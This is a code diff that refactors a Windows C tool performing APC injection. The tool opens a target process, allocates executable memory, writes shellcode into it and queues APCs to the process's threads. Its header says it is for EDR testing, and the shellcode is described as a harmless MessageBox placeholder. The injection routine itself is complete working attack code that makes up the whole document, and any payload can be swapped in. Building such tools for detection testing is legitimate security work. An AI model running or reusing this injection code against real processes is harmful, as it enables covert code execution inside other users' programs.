@@ -11,9 +11,7 @@
  * For EDR testing purposes only.
  */
 
-#include <windows.h>
-#include <stdio.h>
-#include <tlhelp32.h>
+#include "../common/common.h"
 
 // Sample shellcode (MessageBox "Hello from APC!")
 // This is a harmless example for testing
@@ -29,85 +27,66 @@ unsigned char shellcode[] =
     "APC Injection Test\0"
     "\x00\x00\x00\x00\x00\x00\x00\x00";         // MessageBoxA address placeholder
 
-DWORD GetProcessIdByName(const char* processName) {
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-    
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        return 0;
-    }
-    
-    DWORD pid = 0;
-    if (Process32First(hSnapshot, &pe32)) {
-        do {
-            if (_stricmp(pe32.szExeFile, processName) == 0) {
-                pid = pe32.th32ProcessID;
-                break;
-            }
-        } while (Process32Next(hSnapshot, &pe32));
-    }
-    
-    CloseHandle(hSnapshot);
-    return pid;
-}
-
+/**
+ * Perform APC injection into a target process
+ * 
+ * @param pid Target process ID
+ * @return TRUE on success, FALSE on failure
+ */
 BOOL InjectAPC(DWORD pid) {
-    printf("[*] APC Injection Technique\n");
-    printf("[*] Target PID: %d\n", pid);
+    HANDLE hProcess = NULL;
+    HANDLE hSnapshot = NULL;
+    LPVOID pRemoteShellcode = NULL;
+    BOOL success = FALSE;
+    int apcQueued = 0;
     
-    // Step 1: Open target process
-    HANDLE hProcess = OpenProcess(
+    LOG_INFO("APC Injection Technique");
+    LOG_INFO("Target PID: %d\n", pid);
+    
+    // Open target process
+    hProcess = OpenProcess(
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
         FALSE,
         pid
     );
+    CHECK_HANDLE(hProcess, "Failed to open process");
+    LOG_SUCCESS("Process handle obtained");
     
-    if (hProcess == NULL) {
-        printf("[!] Error: Failed to open process. Error: %d\n", GetLastError());
-        return FALSE;
+    // Verify permissions by attempting a small memory allocation
+    LPVOID testAlloc = VirtualAllocEx(hProcess, NULL, 1, MEM_COMMIT, PAGE_READWRITE);
+    if (testAlloc == NULL) {
+        LOG_ERROR("Insufficient permissions for memory operations in target process");
+        goto cleanup;
     }
-    printf("[+] Process handle obtained\n");
+    VirtualFreeEx(hProcess, testAlloc, 0, MEM_RELEASE);
+    LOG_SUCCESS("Process permissions verified");
     
-    // Step 2: Allocate memory for shellcode
-    LPVOID pRemoteShellcode = VirtualAllocEx(
+    // Allocate memory for shellcode
+    pRemoteShellcode = VirtualAllocEx(
         hProcess,
         NULL,
         sizeof(shellcode),
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE
     );
+    CHECK_HANDLE(pRemoteShellcode, "Failed to allocate memory in target process");
+    LOG_SUCCESS("Memory allocated at: 0x%p (%zu bytes)", pRemoteShellcode, sizeof(shellcode));
     
-    if (pRemoteShellcode == NULL) {
-        printf("[!] Error: Failed to allocate memory. Error: %d\n", GetLastError());
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-    printf("[+] Memory allocated at: 0x%p\n", pRemoteShellcode);
-    
-    // Step 3: Write shellcode to allocated memory
+    // Write shellcode to allocated memory
     SIZE_T bytesWritten;
-    if (!WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, sizeof(shellcode), &bytesWritten)) {
-        printf("[!] Error: Failed to write shellcode. Error: %d\n", GetLastError());
-        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-    printf("[+] Shellcode written (%zu bytes)\n", bytesWritten);
+    CHECK_BOOL(
+        WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, sizeof(shellcode), &bytesWritten),
+        "Failed to write shellcode to target process"
+    );
+    LOG_SUCCESS("Shellcode written (%zu bytes)", bytesWritten);
     
-    // Step 4: Enumerate threads in target process
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        printf("[!] Error: Failed to create thread snapshot\n");
-        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
+    // Enumerate threads in target process
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    CHECK_HANDLE(hSnapshot, "Failed to create thread snapshot");
     
     THREADENTRY32 te32;
     te32.dwSize = sizeof(THREADENTRY32);
     
-    int apcQueued = 0;
     if (Thread32First(hSnapshot, &te32)) {
         do {
             if (te32.th32OwnerProcessID == pid) {
@@ -125,8 +104,10 @@ BOOL InjectAPC(DWORD pid) {
                         hThread,
                         0
                     )) {
-                        printf("[+] APC queued to thread ID: %d\n", te32.th32ThreadID);
+                        LOG_SUCCESS("APC queued to thread ID: %d", te32.th32ThreadID);
                         apcQueued++;
+                    } else {
+                        LOG_WARNING("Failed to queue APC to thread ID: %d", te32.th32ThreadID);
                     }
                     CloseHandle(hThread);
                 }
@@ -134,46 +115,51 @@ BOOL InjectAPC(DWORD pid) {
         } while (Thread32Next(hSnapshot, &te32));
     }
     
-    CloseHandle(hSnapshot);
-    CloseHandle(hProcess);
-    
     if (apcQueued > 0) {
-        printf("[+] Successfully queued APCs to %d thread(s)\n", apcQueued);
-        printf("[*] Note: APC will execute when thread enters alertable state\n");
-        return TRUE;
+        LOG_SUCCESS("Successfully queued APCs to %d thread(s)", apcQueued);
+        LOG_INFO("Note: APC will execute when thread enters alertable state");
+        success = TRUE;
     } else {
-        printf("[!] Failed to queue any APCs\n");
-        return FALSE;
+        LOG_ERROR("Failed to queue any APCs");
     }
+    
+cleanup:
+    SAFE_CLOSE_HANDLE(hSnapshot);
+    // Note: We don't free pRemoteShellcode as it needs to remain for APC execution
+    SAFE_CLOSE_HANDLE(hProcess);
+    
+    return success;
 }
 
 int main(int argc, char* argv[]) {
     if (argc < 2) {
-        printf("Usage: %s <process_name_or_pid>\n", argv[0]);
-        printf("Example: %s notepad.exe\n", argv[0]);
-        printf("Example: %s 1234\n", argv[0]);
+        PrintUsage(argv[0],
+                   "<process_name_or_pid>",
+                   "notepad.exe  or  1234");
         return 1;
     }
     
     DWORD pid;
     
     // Check if argument is numeric (PID) or process name
-    if (atoi(argv[1]) != 0 || strcmp(argv[1], "0") == 0) {
-        pid = atoi(argv[1]);
-    } else {
+    char* endptr;
+    pid = strtoul(argv[1], &endptr, 10);
+    
+    if (*endptr != '\0' || pid == 0) {
+        // Not a valid number, treat as process name
         pid = GetProcessIdByName(argv[1]);
         if (pid == 0) {
-            printf("[!] Error: Process '%s' not found\n", argv[1]);
             return 1;
         }
-        printf("[+] Found process with PID: %d\n", pid);
+        LOG_SUCCESS("Found process with PID: %d\n", pid);
     }
     
-    if (!InjectAPC(pid)) {
-        printf("[!] APC injection failed\n");
+    // Perform injection
+    if (InjectAPC(pid)) {
+        LOG_SUCCESS("APC injection completed");
+        return 0;
+    } else {
+        LOG_ERROR("APC injection failed");
         return 1;
     }
-    
-    printf("[+] APC injection completed\n");
-    return 0;
 }
